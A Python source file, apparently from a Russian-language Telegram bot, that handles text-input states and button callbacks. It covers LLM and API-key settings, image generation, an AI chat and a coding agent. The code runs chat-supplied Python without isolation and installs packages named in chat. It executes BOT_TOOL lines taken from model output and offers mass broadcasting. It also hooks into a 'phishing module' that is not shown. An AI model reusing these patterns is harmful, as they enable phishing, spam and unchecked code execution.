        _show_quick_provider(chat_id)
    elif cmd == '/endchat':
        info = session_info(chat_id)
        end_session(chat_id)
        if info:
            send_message("✅ Сессия завершена. Сообщений: {}".format(info['messages']), chat_id,
                        reply_markup=menu_keyboard())
        else:
            send_message("Активной сессии не было.", chat_id)
    else:
        send_message(
            "❓ Не понимаю. Открой меню:", chat_id,
            reply_markup=kb([btn("📋 Открыть меню", "menu")])
        )


def _guard_lock(chat_id):
    """Возвращает True и пишет предупреждение если задача уже выполняется."""
    if _task_lock.locked():
        send_message("⏳ Уже выполняется задача, подожди...", chat_id)
        return True
    return False


def _handle_input(state, text, chat_id):
    """Обработка текстового ввода в режиме ожидания."""
    if state == 'custom_prompt':
        _apply_custom_prompt(text, chat_id)
    elif state == 'voice':
        _apply_voice(text, chat_id)
    elif state == 'llm':
        parts = text.split()
        if len(parts) >= 2:
            _apply_llm(parts[0], parts[1], parts[2] if len(parts) > 2 else None, chat_id)
        else:
            send_message("❌ Неверный формат. Нужно: <code>провайдер модель [key]</code>", chat_id)
    elif state == 'eleven_key':
        _update_env('ELEVEN_API_KEY', text)
        config.reload()
        send_message("✅ ELEVEN_API_KEY сохранён.", chat_id,
                     reply_markup=kb([btn("◀️ Меню TTS", "menu_tts")]))
    elif state == 'eleven_voice':
        _update_env('ELEVEN_VOICE_ID', text)
        config.reload()
        send_message("✅ ElevenLabs voice_id: <b>{}</b>".format(text), chat_id,
                     reply_markup=kb([btn("◀️ Меню TTS", "menu_tts")]))

    # ── Генерация картинок ─────────────────────────────────────────
    elif state.startswith('img_prompt:'):
        provider = state.split(':', 1)[1]
        msg_ref = send_message(f"🎨 Генерирую: <i>{text[:80]}</i>...", chat_id)
        msg_id_img = msg_ref.get('result', {}).get('message_id') if msg_ref else None

        def _st_img(m):
            if msg_id_img:
                try: edit_message(chat_id, msg_id_img, m); return
                except Exception: pass
            send_message(m, chat_id)

        def _do_img():
            try:
                settings = _img_settings.get(chat_id, {})
                prompt_full = text
                # Применяем выбранный стиль
                style = settings.get('style', '') or settings.get('style_suffix', '')
                if style and style.lower() not in text.lower():
                    prompt_full = text + ', ' + style
                size_str = settings.get('size', '1024x1024')
                w, h = (int(x) for x in size_str.split('x')) if 'x' in size_str else (1024, 1024)
                path, used = generate_image(prompt_full, provider=provider,
                                            on_status=_st_img, width=w, height=h)
                ok, err = send_photo_to(chat_id, path,
                    caption=f"🎨 {text[:100]}\n<i>Провайдер: {used}</i>")
                if not ok:
                    # Фото не прошло — шлём как документ
                    send_file_to(chat_id, path, caption=f"🎨 {text[:100]}")
            except Exception as e:
                send_message(f"❌ Ошибка генерации: {e}", chat_id)
            send_message("✅ Готово", chat_id, reply_markup=kb([
                btn("🎨 Ещё картинку",  "menu_image"),
                btn("◀️ Главное меню",  "menu"),
            ]))
        _run_in_thread(_do_img)

    elif state == 'img_add_key':
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            send_message(
                "❌ Формат: <code>провайдер ВАШ_КЛЮЧ</code>\n\n"
                "Примеры:\n"
                "• <code>together ваш_ключ</code>\n"
                "• <code>dalle sk-abc123...</code>\n"
                "• <code>stability sk-abc123...</code>\n"
                "• <code>huggingface hf_abc123...</code>\n"
                "• <code>fal ваш_ключ</code>",
                chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))
        else:
            pname, key_val = parts
            key_map = {
                'dalle':        'OPENAI_API_KEY',
                'openai':       'OPENAI_API_KEY',
                'stability':    'STABILITY_API_KEY',
                'huggingface':  'HF_API_KEY',
                'hf':           'HF_API_KEY',
                'together':     'TOGETHER_API_KEY',
                'fal':          'FAL_API_KEY',
            }
            env_key = key_map.get(pname.lower())
            if env_key:
                _update_env(env_key, key_val.strip())
                config.reload()
                send_message(f"✅ Ключ для <b>{pname}</b> сохранён!\n"
                             f"Переменная: <code>{env_key}</code>",
                             chat_id, reply_markup=kb([btn("🎨 Генерировать", "menu_image")]))
            else:
                send_message(f"❌ Неизвестный провайдер: {pname}\n"
                             f"Доступны: dalle, stability, huggingface",
                             chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    # ── Добавление ключа LLM ───────────────────────────────────────
    elif state.startswith('llm_key_for:'):
        pname   = state.split(':', 1)[1]
        key_val = text.strip()
        if not key_val:
            send_message("❌ Ключ не может быть пустым", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "menu_llm")]))
        else:
            # Используем универсальный config.set_key
            known = config.set_key(pname, key_val)
            config.reload()
            # Если ключ добавлен для текущего провайдера — модели можно сразу протестить
            msg = (f"✅ Ключ для <b>{pname.upper()}</b> сохранён!\n\n"
                   f"Теперь можно выбрать модель → 🧠 LLM настройки")
            if not known:
                msg += f"\n\n⚠️ Провайдер '{pname}' — сохранён как LLM_API_KEY"
            send_message(msg, chat_id, reply_markup=kb(
                [btn(f"🧪 Протестировать {pname}", f"llm_setprov:{pname}")],
                [btn("🔑 Добавить другой ключ", "llm_add_key"),
                 btn("◀️ LLM меню", "menu_llm")],
            ))
    elif state == 'llm_add_key':
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            send_message("❌ Формат: <code>провайдер ВАШ_КЛЮЧ</code>\nПример: <code>groq gsk_abc</code>",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_llm")]))
        else:
            pname, key_val = parts
            pname = pname.lower().strip()
            key_map = {
                'groq':       'GROQ_API_KEY',
                'openai':     'OPENAI_API_KEY',
                'gemini':     'GEMINI_API_KEY',
                'claude':     'ANTHROPIC_API_KEY',
                'anthropic':  'ANTHROPIC_API_KEY',
                'openrouter': 'OPENROUTER_API_KEY',
                'mistral':    'MISTRAL_API_KEY',
                'deepseek':   'DEEPSEEK_API_KEY',
                'xai':        'XAI_API_KEY',
                'cerebras':   'CEREBRAS_API_KEY',
                'sambanova':  'SAMBANOVA_API_KEY',
                'together':   'TOGETHER_API_KEY',
                'cohere':     'COHERE_API_KEY',
                'perplexity': 'PERPLEXITY_API_KEY',
                'kimi':       'KIMI_API_KEY',
                'llama':      'LLAMA_API_KEY',
            }
            env_key = key_map.get(pname, pname.upper() + '_API_KEY')
            _update_env(env_key, key_val.strip())
            config.reload()
            # Автоматически переключаем на этот провайдер
            from llm_checker import RECOMMENDED
            default_model = (RECOMMENDED.get(pname) or [''])[0]
            if default_model:
                config.set_llm(pname, default_model)
            send_message(
                f"✅ Ключ для <b>{pname}</b> сохранён!\n"
                f"<code>{env_key}</code>\n\n"
                f"Провайдер автоматически переключён.\n"
                f"Модель: <code>{config.LLM_MODEL}</code>",
                chat_id,
                reply_markup=kb([btn("🧪 Тест", "test"),
                                 btn("◀️ LLM меню", "menu_llm")]))

    # ── Отправка сообщений ─────────────────────────────────────────
    elif state.startswith('send_target:'):
        mode = state.split(':', 1)[1]
        _pending_agent_task[chat_id] = {'send_mode': mode, 'target': text.strip()}
        prompts2 = {
            'user':     "✏️ Введи текст сообщения:",
            'channel':  "✏️ Введи текст для канала:",
            'file':     "📎 Введи путь к файлу (или отправь файл):",
            'schedule': "✏️ Введи текст сообщения:",
        }
        _wait_state[chat_id] = f'send_text:{mode}'
        send_message(prompts2.get(mode, "✏️ Введи текст:"), chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state.startswith('send_text:'):
        mode   = state.split(':', 1)[1]
        target = (_pending_agent_task.pop(chat_id, {}) or {}).get('target', '')

        if mode == 'schedule':
            _pending_agent_task[chat_id] = {'send_mode': 'schedule',
                                            'target': target, 'text': text}
            _wait_state[chat_id] = 'send_delay'
            send_message("⏰ Через сколько секунд отправить? (например: 60):", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "menu_send")]))
        elif mode in ('user', 'channel'):
            def _do_send():
                send_fn = send_to_user if mode == 'user' else send_to_channel
                ok, err = send_fn(target, text)
                msg = f"✅ Отправлено → <code>{target}</code>" if ok else f"❌ Ошибка: {err}"
                send_message(msg, chat_id,
                             reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
            _run_in_thread(_do_send)
        elif mode == 'file':
            def _do_file():
                fpath = text.strip().strip('"\'')
                if not os.path.isabs(fpath):
                    fpath = os.path.join(os.path.dirname(os.path.abspath(__file__)), fpath)
                ok, err = send_file_to(target, fpath)
                msg = f"✅ Файл отправлен → <code>{target}</code>" if ok else f"❌ {err}"
                send_message(msg, chat_id,
                             reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
            _run_in_thread(_do_file)

    elif state == 'send_delay':
        task_data = _pending_agent_task.pop(chat_id, {}) or {}
        try:
            delay = int(text.strip())
            task_id = schedule_message(
                task_data.get('target', chat_id),
                task_data.get('text', ''),
                delay,
                on_sent=lambda ok, err: send_message(
                    f"✅ Запланированное сообщение {'отправлено' if ok else 'не отправлено: ' + str(err)}",
                    chat_id)
            )
            send_message(
                f"✅ Запланировано! Отправится через <b>{delay}с</b>\nID: <code>{task_id}</code>",
                chat_id, reply_markup=kb([btn("📋 Список", "send_scheduled"),
                                          back_btn("menu_send")]))
        except ValueError:
            send_message("❌ Введи число секунд", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state.startswith('send_targets:'):
        mode = state.split(':', 1)[1]
        targets_raw = text.strip()
        targets = [t.strip() for t in targets_raw.replace('\n', ',').split(',') if t.strip()]
        _pending_agent_task[chat_id] = {'send_mode': 'broadcast', 'targets': targets}
        _wait_state[chat_id] = 'send_broadcast_text'
        send_message(f"📣 Получатели: <b>{len(targets)}</b>\n\n✏️ Введи текст рассылки:",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state == 'send_broadcast_text':
        task_data = _pending_agent_task.pop(chat_id, {}) or {}
        targets   = task_data.get('targets', [])
        if not targets:
            send_message("❌ Нет получателей", chat_id)
        else:
            send_message(f"📣 Рассылка: <b>{len(targets)}</b> получателей...\n⏳ Начинаю...", chat_id)
            def _do_broadcast():
                def _prog(sent, total, err):
                    if sent % 5 == 0 or sent == total:
                        send_message(f"📣 {sent}/{total} отправлено", chat_id)
                result = broadcast(targets, text, on_progress=_prog)
                send_message(
                    f"✅ Рассылка завершена!\n"
                    f"Отправлено: <b>{result['sent']}</b>\n"
                    f"Ошибок: <b>{result['failed']}</b>",
                    chat_id, reply_markup=back_btn("menu_send"))
            _run_in_thread(_do_broadcast)

    elif state == 'update_install_pkg':
        pkg = text.strip()
        send_message(f"📦 Устанавливаю <code>{pkg}</code>...", chat_id)
        def _do_inst():
            ok, msg = install_package(pkg)
            status = "✅ Установлен" if ok else "❌ Ошибка"
            send_message(f"{status}: <code>{pkg}</code>\n<pre>{msg[:300]}</pre>",
                         chat_id, reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_inst)

    elif state == 'agent_youtube_url':
        # Пользователь прислал URL — сохраняем и показываем выбор формата
        import re as _re
        url_text = text.strip()
        # Вытаскиваем URL из сообщения (пользователь мог написать что-то лишнее)
        m_url = _re.search(r'https?://[^\s]+', url_text)
        url = m_url.group(0) if m_url else url_text

        _yt_pending_url[chat_id] = url
        send_message(
            "🔗 <code>{}</code>\n\nВыбери формат:".format(url),
            chat_id,
            reply_markup=kb(
                [btn("🎬 MP4 — видео",   "yt_fmt:mp4"),
                 btn("🎵 MP3 — аудио",   "yt_fmt:mp3")],
                [btn("🎬 MP4 360p (лёгкий)", "yt_fmt:mp4_360"),
                 btn("🎬 MP4 1080p (тяжёлый)", "yt_fmt:mp4_1080")],
                [btn("❌ Отмена",         "menu_agent")],
            ))

    elif state.startswith('coder_input:'):
        # Универсальный обработчик ввода для агента-кодера
        proj_mode = state.split(':', 1)[1]  # write / review / fix / project / sandbox / bot_tools / file

        if proj_mode == 'sandbox':
            # Sandbox: запускаем код напрямую без LLM-генерации
            send_message("🏖 <b>Sandbox — запускаю...</b>", chat_id)
            def _do_sandbox():
                import tempfile, subprocess as _sp
                # Извлекаем код из блока ```python``` если есть
                import re as _re
                code_match = _re.search(r'```(?:python)?\n(.*?)```', text, _re.DOTALL)
                code = code_match.group(1).strip() if code_match else text.strip()
                with tempfile.NamedTemporaryFile(suffix='.py', mode='w',
                                                 delete=False, encoding='utf-8') as tf:
                    tf.write(code)
                    tmp_path = tf.name
                try:
                    result = _sp.run(
                        ['python3', tmp_path],
                        capture_output=True, text=True, timeout=30,
                        cwd=os.path.dirname(os.path.abspath(__file__))
                    )
                    out = result.stdout or ''
                    err = result.stderr or ''
                    rc  = result.returncode
                    msg = "🏖 <b>Sandbox результат</b> (rc={}):\n".format(rc)
                    if out:
                        msg += "\n<b>stdout:</b>\n<pre>{}</pre>".format(
                            out[:2000].replace('<','&lt;').replace('>','&gt;'))
                    if err:
                        msg += "\n<b>stderr:</b>\n<pre>{}</pre>".format(
                            err[:1000].replace('<','&lt;').replace('>','&gt;'))
                    if not out and not err:
                        msg += "\n<i>(нет вывода)</i>"
                except _sp.TimeoutExpired:
                    msg = "⏰ Sandbox: таймаут 30 сек"
                except Exception as e:
                    msg = "❌ Sandbox ошибка: {}".format(e)
                finally:
                    try: os.unlink(tmp_path)
                    except Exception: pass
                send_message(msg, chat_id, reply_markup=kb([
                    btn("🏖 Запустить ещё", "coder:sandbox"),
                    btn("◀️ Агент-кодер",  "agent_code_start"),
                ]))
            _run_in_thread(_do_sandbox)

        elif proj_mode == 'bot_tools':
            # Агент с доступом к инструментам бота
            send_message("🤖 <b>Агент с инструментами бота...</b>", chat_id)
            def _do_bot_tools():
                from chat_agent import code_agent_run
                from bot_tools import execute_bot_tool, get_tools_help
                def _send(txt, cid): send_message(txt, cid)
                def _sdoc(path, caption, chat_id): send_document(path, caption=caption, chat_id=chat_id)

                # Запускаем агента, перехватываем BOT_TOOL команды из вывода
                result = code_agent_run(chat_id, text,
                                        on_status=lambda m: send_message(m, chat_id),
                                        proj_mode=None)
                full_out = result.get('_full_output', '')

                # Ищем и выполняем BOT_TOOL команды в выводе
                import re as _re
                for m in _re.finditer(r'BOT_TOOL:\s*(.+)', full_out):
                    cmd_line = m.group(1).strip()
                    send_message("🔧 Выполняю: <code>{}</code>".format(cmd_line), chat_id)
                    tool_result = execute_bot_tool(cmd_line, chat_id, _send, _sdoc)
                    send_message("↩️ {}".format(tool_result), chat_id)

                if full_out and 'BOT_TOOL:' not in full_out:
                    send_message(full_out[:3000], chat_id)
                send_message("✅ Готово", chat_id, reply_markup=kb([
                    btn("◀️ Агент-кодер", "agent_code_start")
                ]))
            _run_in_thread(_do_bot_tools)

        else:
            # Стандартные режимы: write, review, fix, project, file
            pm_map = {
                'write':   None,
                'review':  'review',
                'fix':     'fix',
                'project': 'plan',
                'file':    None,
            }
            pm = pm_map.get(proj_mode, None)
            _run_code_task(chat_id, text, proj_mode=pm)

    elif state == 'chat_websearch':
        # Веб-поиск прямо из чата
        send_message("🌐 Ищу: <i>{}</i>...".format(text[:100]), chat_id)
        def _do_search():
            from llm_client import call_llm
            prompt = (
                "Пользователь просит найти информацию в интернете: {}\n\n"
                "У тебя нет прямого доступа к интернету, но ответь на основе своих знаний "
                "максимально подробно. Если информация может быть устаревшей — скажи об этом."
            ).format(text)
            reply = call_llm(prompt)
            send_message(reply[:3500], chat_id, reply_markup=chat_control_keyboard(mode='chat'))
        _run_in_thread(_do_search)

    elif state == 'chat_persona':
        # Смена роли/личности ИИ
        from chat_agent import add_to_history
        add_to_history(chat_id, 'system' if False else 'user',
                       "[СИСТЕМНАЯ ИНСТРУКЦИЯ] " + text)
        send_message(
            "🎭 Роль установлена:\n<i>{}</i>\n\n"
            "Теперь я буду отвечать в этой роли.".format(text[:200]),
            chat_id, reply_markup=chat_control_keyboard(mode='chat'))

    elif state == 'tools_save_html':
        from bot_tools import execute_bot_tool
        def _send(txt, cid): send_message(txt, cid)
        def _sdoc(path, cap, chat_id): send_document(path, caption=cap, chat_id=chat_id)
        def _do():
            result = execute_bot_tool('save_html ' + text.strip(), chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        _run_in_thread(_do)

    elif state == 'fix_input':
        send_message("🔧 Запускаю агент исправления...", chat_id)
        def _do_fix():
            from chat_agent import code_agent_run
            result = code_agent_run(chat_id, text, on_status=lambda m: send_message(m, chat_id))
            out = result.get('_full_output') or result.get('output','')
            if out:
                _send_chunked(chat_id, out[:4000])
            if result.get('code'):
                import html as _h
                send_message(
                    "<b>Исправленный код:</b>\n<pre>{}</pre>".format(_h.escape(result['code'][:3000])),
                    chat_id, reply_markup=chat_control_keyboard())
        _run_in_thread(_do_fix)

    elif state == 'analyze_input':
        send_message("🔍 Анализирую...", chat_id)
        def _do_analyze():
            try:
                from agent_core import analyze_code, extract_code as _ec, SYS_ANALYZER
                from llm_client import call_llm
                code = _ec(text)
                result = analyze_code(code, text) if code else call_llm(text, SYS_ANALYZER, max_tokens=2000)
            except Exception as e:
                result = "❌ Ошибка: {}".format(e)
            _send_chunked(chat_id, result[:4000])
        _run_in_thread(_do_analyze)

    elif state == 'file_custom_input':
        pending = _pending_file.pop(chat_id, None)
        if not pending:
            send_message("❌ Файл не найден. Загрузи снова.", chat_id,
                         reply_markup=chat_control_keyboard())
            return
        send_message("⚙️ Выполняю: <i>{}</i>".format(text[:100]), chat_id)
        try:
            with open(pending['path'], 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
        except Exception:
            file_content = pending['analysis']
        full_task = "{}\n\nФайл: {}\n\n```\n{}\n```".format(
            text, pending['filename'], file_content[:8000])
        _run_in_thread(_run_code_task, chat_id, full_task)

    elif state == 'agentv2_task' and AUTH_ENABLED:
        if _auth_limit_guard(chat_id):
            _run_agentv2_task(chat_id, text)

    elif state == 'agentv2_code' and AUTH_ENABLED:
        code = text
        if code.startswith('```'):
            lines = code.split('\n')
            code  = '\n'.join(lines[1:-1] if lines[-1] == '```' else lines[1:])
        _run_sandbox(chat_id, code)

    else:
        # Передаём в фишинг-модуль если это fish_ состояние
        if FISH_ENABLED and state.startswith('fish_'):
            _fish_handle_wait_state(state, text, chat_id)
        else:
            send_message("❓ Неизвестное состояние. Нажми /menu", chat_id)


def _apply_custom_prompt(text, chat_id):
    STYLES['custom']['system'] = text
    _update_env('REWRITE_STYLE', 'custom')
    config.reload()
    preview = text[:200] + ('...' if len(text) > 200 else '')
    send_message(
        "✅ Свой промт сохранён и активирован!\n\n<i>{}</i>".format(preview),
        chat_id, reply_markup=kb([btn("◀️ Главное меню", "menu")])
    )

def _apply_llm(provider, model, api_key, chat_id):
    _update_env('LLM_PROVIDER', provider.lower())
    _update_env('LLM_MODEL', model)
    if api_key:
        _update_env('LLM_API_KEY', api_key)
        # Также сохраняем как провайдер-специфичный ключ
        try:
            from llm_client import _PROVIDER_KEY_MAP
            attr = _PROVIDER_KEY_MAP.get(provider.lower(), '')
            if attr and attr != 'LLM_API_KEY':
                _update_env(attr, api_key)
        except Exception:
            pass
    config.reload()
    send_message(
        "✅ LLM обновлён:\nПровайдер: <b>{}</b>\nМодель: <b>{}</b>".format(
            config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id,
        reply_markup=kb([btn("🧪 Тест", "test"), btn("◀️ LLM меню", "menu_llm")])
    )

def _apply_voice(val, chat_id):
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    if provider in ('eleven', 'elevenlabs', '11labs'):
        _update_env('ELEVEN_VOICE_ID', val)
        config.reload()
        send_message("✅ ElevenLabs voice_id: <b>{}</b>".format(val), chat_id,
                     reply_markup=kb([btn("◀️ Назад", "menu_tts")]))
    else:
        _update_env('TTS_VOICE', val)
        config.reload()
        send_message("✅ Голос: <b>{}</b>".format(val), chat_id,
                     reply_markup=kb([btn("◀️ Назад", "menu_tts")]))

def _show_env(chat_id):
    lines = ["📁 <code>{}</code>\n".format(config.ENV_PATH)]
    try:
        with open(config.ENV_PATH) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                key, _, val = line.partition('=')
                if any(s in key for s in ('KEY', 'TOKEN', 'SECRET')):
                    val = val[:4] + '***' if val else '(пусто)'
                lines.append("<code>{}={}</code>".format(key, val))
    except FileNotFoundError:
        lines.append('❌ .env не найден!')
    send_message("\n".join(lines), chat_id,
                 reply_markup=kb([btn("◀️ Главное меню", "menu")]))


# ══════════════════════════════════════════════════════════════
#  ОБРАБОТЧИК CALLBACK QUERY (inline-кнопки)
# ══════════════════════════════════════════════════════════════

def handle_callback(cq):
    """Центральный роутер для всех нажатий inline-кнопок."""
    cb_id   = cq['id']
    data    = cq.get('data', '')
    chat_id = str(cq['message']['chat']['id'])
    msg_id  = cq['message']['message_id']

    # Разбираем формат "action" или "action:arg"
    action, _, arg = data.partition(':')

    try:
        _route_callback(action, arg, cb_id, chat_id, msg_id)
    except Exception as e:
        # Любая ошибка — сразу показываем пользователю, не глотаем молча
        print("❌ Callback error [{}]: {}".format(data, e), flush=True)
        answer_callback(cb_id, "❌ Ошибка: {}".format(str(e)[:100]), alert=True)
        send_message("❌ Ошибка при обработке кнопки:\n<code>{}</code>".format(e), chat_id)


def _route_callback(action, arg, cb_id, chat_id, msg_id):
    """Вся логика роутинга callback-ов."""

    # ── Auth MODULE callbacks (капча) ───────────────────────────
    if AUTH_MOD and action == 'captcha_new':
        question = auth_module.captcha_refresh(chat_id)
        auth_module.auth_state_set(chat_id, "captcha")
        send_message(question, chat_id, parse_mode="Markdown",
                     reply_markup=kb([btn("🔄 Другой пример", "captcha_new")]))
        answer_callback(cb_id)
        return

    # ── Auth / Agent v2 (новые модули) ────────────────────────
    if AUTH_ENABLED and _handle_auth_callback(action, arg, cb_id, chat_id, msg_id):
        return

    # ── Навигация ─────────────────────────────────────────────
    if action == 'menu':
        edit_message(chat_id, msg_id, _current_status_text(), reply_markup=menu_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_style':
        sk = _get_env_style()
        si = STYLES.get(sk, {})
        text = (
            "🎭 <b>Стиль переписывания</b>\n\n"
            "Текущий: {} <b>{}</b>\n"
            "<i>{}</i>"
        ).format(si.get('emoji', ''), si.get('name', sk), si.get('description', ''))
        edit_message(chat_id, msg_id, text, reply_markup=style_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_tts':
        provider = (config.TTS_PROVIDER or 'edge').lower().strip()
        lang_key  = os.environ.get('TTS_LANGUAGE', 'ru')
        lang_name = TTS_LANGUAGES.get(lang_key, {}).get('name', lang_key)
        if provider in ('eleven', 'elevenlabs', '11labs'):
            voice_line = "ElevenLabs | {}".format(config.ELEVEN_VOICE_ID or '(не задан)')
        else:
            voice_line = "edge-tts | {} | {}".format(lang_name, config.TTS_VOICE)
        edit_message(chat_id, msg_id,
            "🎙 <b>TTS настройки</b>\n\nТекущий: <b>{}</b>".format(voice_line),
            reply_markup=tts_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_lang':
        lang_key  = os.environ.get('TTS_LANGUAGE', 'ru')
        lang_name = TTS_LANGUAGES.get(lang_key, {}).get('name', lang_key)
        edit_message(chat_id, msg_id,
            "🌍 <b>Язык озвучки (edge-tts)</b>\n\nТекущий: <b>{}</b>".format(lang_name),
            reply_markup=lang_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_llm':
        edit_message(chat_id, msg_id,
            "🧠 <b>LLM настройки</b>\n\n"
            "Провайдер: <b>{}</b>\n"
            "Модель: <b>{}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=llm_keyboard())
        answer_callback(cb_id)

    # ── Стили ─────────────────────────────────────────────────
    elif action == 'style':
        if arg not in STYLES:
            answer_callback(cb_id, "Неизвестный стиль", alert=True)
            return
        if arg == 'custom' and not STYLES['custom']['system']:
            answer_callback(cb_id)
            _wait_state[chat_id] = 'custom_prompt'
            send_message("✏️ Стиль «Свой» не настроен.\nВведи системный промт:", chat_id)
            return
        _update_env('REWRITE_STYLE', arg)
        config.reload()
        si = STYLES[arg]
        answer_callback(cb_id, "✅ Стиль: {}".format(si['name']))
        edit_message(chat_id, msg_id,
            "🎭 <b>Стиль переписывания</b>\n\n"
            "Активен: {} <b>{}</b>\n<i>{}</i>".format(
                si['emoji'], si['name'], si['description']),
            reply_markup=style_keyboard())

    elif action == 'set_custom_prompt':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'custom_prompt'
        cur = STYLES['custom']['system']
        hint = "\n\nТекущий:\n<i>{}</i>".format(cur[:300]) if cur else ""
        send_message("✏️ Введи системный промт для стиля «Свой»:{}".format(hint), chat_id)

    # ── TTS провайдер ─────────────────────────────────────────
    elif action == 'tts_prov':
        prov = 'edge' if arg == 'edge' else 'elevenlabs'
        _update_env('TTS_PROVIDER', prov)
        config.reload()
        if prov == 'elevenlabs' and not config.ELEVEN_API_KEY:
            answer_callback(cb_id)
            _wait_state[chat_id] = 'eleven_key'
            send_message("🔑 ElevenLabs выбран.\nВведи API ключ (xi-api-key):", chat_id)
        else:
            answer_callback(cb_id, "✅ TTS: {}".format(prov))
            edit_message(chat_id, msg_id,
                "🎙 <b>TTS настройки</b>\n\nПровайдер: <b>{}</b>".format(prov),
                reply_markup=tts_keyboard())

    # ── Язык TTS ──────────────────────────────────────────────
    elif action == 'lang':
        if arg not in TTS_LANGUAGES:
            answer_callback(cb_id, "Неизвестный язык", alert=True)
            return
        lang_info = TTS_LANGUAGES[arg]
        _update_env('TTS_LANGUAGE', arg)
        _update_env('TTS_VOICE', lang_info['default_voice_m'])  # дефолтный голос для языка
        config.reload()
        answer_callback(cb_id, "✅ Язык: {}".format(lang_info['name']))
        edit_message(chat_id, msg_id,
            "🌍 <b>Язык озвучки</b>\n\n"
            "Выбран: <b>{}</b>\n"
            "Дефолтный голос: <code>{}</code>\n\n"
            "<i>📋 Список голосов — посмотреть все варианты</i>".format(
                lang_info['name'], lang_info['default_voice_m']),
            reply_markup=lang_keyboard())

    # ── Голос ─────────────────────────────────────────────────
    elif action == 'set_voice':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'voice'
        send_message(
            "🎙 Введи ShortName голоса:\n"
            "• edge-tts: <code>ru-RU-DmitryNeural</code>\n"
            "• ElevenLabs: voice_id из /voices\n\n"
            "Список голосов: нажми 📋 Список голосов",
            chat_id)

    elif action == 'voices':
        answer_callback(cb_id, "Загружаю голоса...")
        _run_in_thread(task_voices, chat_id)

    # ── LLM ───────────────────────────────────────────────────
    elif action == 'llm_info':
        presets = {
            'ollama':    ('ollama',    'llama3.2',                    None),
            'openai':    ('openai',    'gpt-4o-mini',                 True),
            'gemini':    ('gemini',    'gemini-2.0-flash',            True),
            'mistral':   ('mistral',   'mistral-small-latest',        True),
            'claude':    ('claude',    'claude-3-haiku-20240307',     True),
            'deepseek':  ('deepseek',  'deepseek-chat',               True),
            'groq':      ('groq',      'llama-3.3-70b-versatile',     True),
            'xai':       ('xai',       'grok-3-mini',                 True),
            'kimi':      ('kimi',      'moonshot-v1-8k',              True),
            'llama':     ('llama',     'Llama-4-Scout-17B-16E-Instruct', True),
            'cohere':    ('cohere',    'command-r-plus',              True),
            'kluster':   ('kluster',   'klusterai/Meta-Llama-3.3-70B-Instruct-Turbo', True),
        }
        if arg in presets:
            p, m, needs_key = presets[arg]
            if needs_key:
                answer_callback(cb_id)
                send_message(
                    "🧠 Чтобы подключить <b>{}</b>, введи:\n"
                    "<code>/setllm {} {} YOUR_API_KEY</code>\n\n"
                    "Или нажми «Ввести вручную»:\n"
                    "<code>{} {} YOUR_API_KEY</code>".format(arg, p, m, p, m),
                    chat_id, reply_markup=kb([back_btn("menu_llm")]))
            else:
                # Ollama — без ключа, применяем сразу
                answer_callback(cb_id, "✅ Применяю Ollama...")
                _apply_llm(p, m, None, chat_id)

    elif action == 'set_llm':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'llm'
        send_message(
            "🧠 Введи настройки LLM:\n"
            "<code>провайдер модель [api_key]</code>\n\n"
            "Примеры:\n"
            "<code>ollama llama3.2</code>\n"
            "<code>gemini gemini-2.0-flash YOUR_KEY</code>\n"
            "<code>openai gpt-4o-mini YOUR_KEY</code>",
            chat_id)

    # ── Задачи ────────────────────────────────────────────────
    elif action in ('run', 'parse', 'process'):
        if _task_lock.locked():
            answer_callback(cb_id, "⏳ Уже выполняется задача!", alert=True)
            return
        answer_callback(cb_id)
        task_map = {'run': task_run, 'parse': task_parse, 'process': task_process}
        _run_in_thread(task_map[action], chat_id)

    elif action == 'test':
        answer_callback(cb_id, "Запускаю тест...")
        _run_in_thread(task_test, chat_id)

    elif action == 'check_providers':
        answer_callback(cb_id, "🔍 Проверяю все провайдеры...")
        _run_in_thread(task_check_providers, chat_id)

    elif action == 'stats':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, _current_status_text(), reply_markup=menu_keyboard())

    elif action == 'env':
        answer_callback(cb_id)
        _show_env(chat_id)

    elif action == 'help':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, _help_text(),
                     reply_markup=kb([btn("◀️ Меню", "menu")]))

    # ── ИИ Агент ──────────────────────────────────────────────
    elif action == 'menu_agent':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "🤖 <b>ИИ Агент</b>\n\n"
            "💬 <b>Чат</b> — разговор с ИИ, история сохраняется\n"
            "💻 <b>Кодер</b> — описываешь задачу, агент пишет и запускает Python-код\n\n"
            "Модель: <b>{} / {}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=agent_keyboard(chat_id))

    elif action == 'agent_chat_start':
        answer_callback(cb_id)
        start_session(chat_id, 'chat')
        edit_message(chat_id, msg_id,
            "💬 <b>ИИ-чат запущен!</b>\n\n"
            "Пиши любое сообщение — я отвечу.\n"
            "Модель: <b>{} / {}</b>\n\n"
            "Дополнительные функции:\n"
            "• 🌐 <b>Поиск в сети</b> — задай вопрос с пометкой <i>найди в интернете</i>\n"
